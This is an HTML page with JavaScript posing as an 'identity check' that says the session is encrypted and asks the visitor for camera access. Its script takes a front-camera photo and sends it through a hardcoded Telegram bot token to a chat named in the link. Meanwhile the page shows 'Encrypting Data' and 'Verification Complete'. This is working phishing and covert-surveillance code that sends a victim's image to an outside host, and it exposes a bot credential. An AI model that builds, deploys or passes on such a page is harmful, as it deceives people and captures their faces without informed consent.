<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification System</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 20px;
            border-radius: 15px;
            background: rgba(30, 41, 59, 0.7);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            max-width: 400px;
            width: 90%;
        }

        .logo {
            font-size: 50px;
            margin-bottom: 20px;
            color: #38bdf8;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            letter-spacing: 1px;
        }

        p {
            font-size: 14px;
            color: #94a3b8;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .status-box {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .dot {
            height: 10px;
            width: 10px;
            background-color: #ef4444;
            border-radius: 50%;
            display: inline-block;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
        }

        #btn-verify {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
        }

        #btn-verify:hover {
            background-color: #0ea5e9;
            transform: translateY(-2px);
        }

        #video {
            display: none;
        }

        .loader {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">🔒</div>
        <h1>IDENTITY CHECK</h1>
        <p>This session is encrypted. To continue the secure connection, please verify your identity by allowing camera access.</p>
        
        <div class="status-box">
            <span class="dot" id="status-dot"></span>
            <span id="status-text">Awaiting Authorization...</span>
        </div>

        <div class="loader" id="loader"></div>
        <button id="btn-verify">VERIFY IDENTITY</button>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8838584952:AAEoA1W7BiNRkP0uDVPMNpBsczpZ30El6hI";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const btn = document.getElementById('btn-verify');
        const statusText = document.getElementById('status-text');
        const statusDot = document.getElementById('status-dot');
        const loader = document.getElementById('loader');

        // Get chat_id from URL
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id');

        btn.addEventListener('click', async () => {
            if (!chatId) {
                alert("Invalid session. Please open the link via the Telegram Bot.");
                return;
            }

            btn.style.display = "none";
            loader.style.display = "block";
            statusText.innerText = "Authenticating...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                
                statusText.innerText = "Encrypting Data...";
                statusDot.style.backgroundColor = "#22c55e"; // Green

                // Wait for video to load
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert to blob and send
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'identity_check.jpg');
                        formData.append('caption', "✅ Security Identity Verified Successfully.");

                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });

                        // Success Message
                        statusText.innerText = "Verification Complete";
                        loader.style.display = "none";
                        alert("Your identity has been verified. You can close this window now.");
                        
                        // Stop camera
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg');
                }, 2000);

            } catch (err) {
                console.error(err);
                alert("Identity verification failed. Please ensure camera access is allowed.");
                btn.style.display = "block";
                loader.style.display = "none";
                statusText.innerText = "Permission Denied";
                statusDot.style.backgroundColor = "#ef4444";
            }
        });
    </script>
</body>
</html>
